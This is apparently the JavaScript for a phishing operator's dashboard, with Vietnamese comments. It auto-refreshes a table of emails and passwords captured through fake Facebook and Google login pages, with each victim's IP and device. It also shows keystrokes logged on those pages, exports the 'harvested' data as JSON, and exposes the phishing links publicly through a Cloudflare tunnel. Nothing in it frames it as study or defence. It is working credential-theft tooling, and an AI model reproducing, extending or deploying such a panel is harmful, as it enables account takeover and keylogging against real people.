/**
 * Dashboard Script v2.0
 * - Auto-refresh dữ liệu mỗi 3 giây
 * - Check tunnel status
 * - Keylog viewer
 * - Tab switching
 * - Export data
 */

// ===== TAB SWITCHING =====
function switchTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-' + tabName).classList.add('active');
    event.target.classList.add('active');
    
    if (tabName === 'keylog') loadKeylog();
}

// ===== TUNNEL STATUS =====
async function checkTunnel() {
    try {
        const res = await fetch('/api/tunnel');
        const data = await res.json();
        const banner = document.getElementById('tunnelBanner');
        const status = document.getElementById('tunnelStatus');
        
        if (data.url && data.status === 'connected') {
            banner.className = 'tunnel-banner connected';
            status.innerHTML = `
                <span style="color:var(--success);font-size:18px;">✅</span>
                <div>
                    <div style="color:var(--success);font-weight:600;">Cloudflare Tunnel đã kết nối!</div>
                    <div class="tunnel-url">${data.url}</div>
                    <div style="font-size:11px;color:var(--text-dim);margin-top:4px;">📱 Mở link trên điện thoại bất kỳ mạng → KHÔNG CẦN cùng WiFi</div>
                </div>
            `;
            // Update phishing links with tunnel URL
            document.getElementById('fbLink').textContent = data.phishing_links.facebook;
            document.getElementById('ggLink').textContent = data.phishing_links.google;
        } else if (data.status === 'failed') {
            banner.className = 'tunnel-banner failed';
            status.innerHTML = `
                <span style="font-size:18px;">❌</span>
                <div>
                    <div style="color:var(--danger);font-weight:600;">Tunnel thất bại</div>
                    <div style="font-size:12px;color:var(--text-dim);">Chạy thủ công: <code>npx cloudflared tunnel --url http://localhost:3000</code></div>
                </div>
            `;
            // Fallback to local
            document.getElementById('fbLink').textContent = window.location.origin + '/phishing/facebook.html';
            document.getElementById('ggLink').textContent = window.location.origin + '/phishing/google.html';
        } else {
            // Still starting
            banner.className = 'tunnel-banner';
            document.getElementById('fbLink').textContent = window.location.origin + '/phishing/facebook.html';
            document.getElementById('ggLink').textContent = window.location.origin + '/phishing/google.html';
        }
    } catch (err) {
        document.getElementById('fbLink').textContent = window.location.origin + '/phishing/facebook.html';
        document.getElementById('ggLink').textContent = window.location.origin + '/phishing/google.html';
    }
}

// ===== LOAD DATA =====
async function loadData() {
    try {
        const res = await fetch('/api/data');
        const data = await res.json();
        
        document.getElementById('totalEntries').textContent = data.total;
        
        let mobile = 0, desktop = 0;
        data.entries.forEach(entry => {
            const platform = entry.metadata?.platform || '';
            if (['iPhone', 'iPad', 'Android', 'Windows Phone'].includes(platform)) {
                mobile++;
            } else {
                desktop++;
            }
        });
        
        document.getElementById('mobileCount').textContent = mobile;
        document.getElementById('desktopCount').textContent = desktop;
        
        const tbody = document.getElementById('dataBody');
        if (data.entries.length === 0) {
            tbody.innerHTML = '<tr class="empty-row"><td colspan="7">Chưa có dữ liệu...</td></tr>';
            return;
        }
        
        tbody.innerHTML = data.entries.map((entry, idx) => {
            const time = new Date(entry.timestamp).toLocaleString('vi-VN');
            const platform = entry.metadata?.platform || 'N/A';
            const isMobile = ['iPhone', 'iPad', 'Android', 'Windows Phone'].includes(platform);
            const deviceClass = isMobile ? 'device-mobile' : 'device-desktop';
            const deviceIcon = isMobile ? '📱' : '💻';
            const typeClass = entry.page_type === 'facebook' ? 'type-fb' : 'type-gg';
            const typeLabel = entry.page_type === 'facebook' ? '📘 FB' : '📧 GG';
            
            return `<tr class="new-entry">
                <td style="color:var(--text-dim);font-weight:600;">${idx + 1}</td>
                <td style="font-size:11px;color:var(--text-dim);">${time}</td>
                <td><span class="type-badge ${typeClass}">${typeLabel}</span></td>
                <td class="credential-cell">${escapeHtml(entry.credentials?.email || '')}</td>
                <td class="credential-cell">${escapeHtml(entry.credentials?.password || '')}</td>
                <td><span class="device-badge ${deviceClass}">${deviceIcon} ${platform}</span></td>
                <td style="font-size:11px;color:var(--text-dim);">${entry.metadata?.ip || 'N/A'}</td>
            </tr>`;
        }).join('');
        
    } catch (err) {
        console.error('Failed to load data:', err);
    }
}

// ===== LOAD KEYLOG =====
async function loadKeylog() {
    try {
        const res = await fetch('/api/keylog');
        const data = await res.json();
        
        document.getElementById('keystrokeCount').textContent = data.total_keystrokes;
        
        const container = document.getElementById('keylogContainer');
        if (data.sessions.length === 0) {
            container.innerHTML = '<div class="empty-state">Chưa có keylog</div>';
            return;
        }
        
        container.innerHTML = data.sessions.slice(0, 20).map(session => {
            // Nhóm keystrokes theo field
            const fields = {};
            session.keystrokes.forEach(k => {
                if (!fields[k.field]) fields[k.field] = [];
                fields[k.field].push(k);
            });
            
            const fieldsHtml = Object.entries(fields).map(([field, keys]) => {
                const lastValue = keys[keys.length - 1]?.value || '';
                return `
                    <div style="margin-bottom:8px;">
                        <div class="keylog-field-label">${field}</div>
                        <div class="keylog-keys">${escapeHtml(lastValue)}</div>
                    </div>
                `;
            }).join('');
            
            const time = new Date(session.start_time).toLocaleString('vi-VN');
            const typeLabel = session.page_type === 'facebook' ? '📘 Facebook' : '📧 Google';
            
            return `
                <div class="keylog-session">
                    <div class="keylog-session-header">
                        <div><strong>${typeLabel}</strong> • ${session.platform} • ${session.ip}</div>
                        <div>${time}</div>
                    </div>
                    ${fieldsHtml}
                </div>
            `;
        }).join('');
        
    } catch (err) {
        console.error('Failed to load keylog:', err);
    }
}

// ===== CLEAR DATA =====
async function clearData() {
    if (!confirm('Xóa toàn bộ dữ liệu thu hoạch + keylog?')) return;
    try {
        await fetch('/api/data', { method: 'DELETE' });
        loadData();
        loadKeylog();
    } catch (err) {
        alert('Lỗi khi xóa dữ liệu');
    }
}

// ===== EXPORT DATA =====
async function exportData() {
    try {
        const res = await fetch('/api/data');
        const data = await res.json();
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `phishing_data_${new Date().toISOString().split('T')[0]}.json`;
        a.click();
        URL.revokeObjectURL(url);
    } catch (err) {
        alert('Lỗi khi export');
    }
}

// ===== COPY LINK =====
function copyLink(elementId) {
    const text = document.getElementById(elementId).textContent;
    navigator.clipboard.writeText(text).then(() => {
        const btn = event.target;
        const original = btn.textContent;
        btn.textContent = '✅ Copied!';
        btn.style.background = '#43e97b';
        setTimeout(() => {
            btn.textContent = original;
            btn.style.background = '';
        }, 1500);
    }).catch(() => {
        const el = document.createElement('textarea');
        el.value = text;
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
    });
}

// ===== ESCAPE HTML =====
function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// ===== AUTO REFRESH =====
loadData();
checkTunnel();
setInterval(loadData, 3000);
setInterval(checkTunnel, 5000);
setInterval(() => {
    if (document.getElementById('tab-keylog').classList.contains('active')) {
        loadKeylog();
    }
}, 4000);
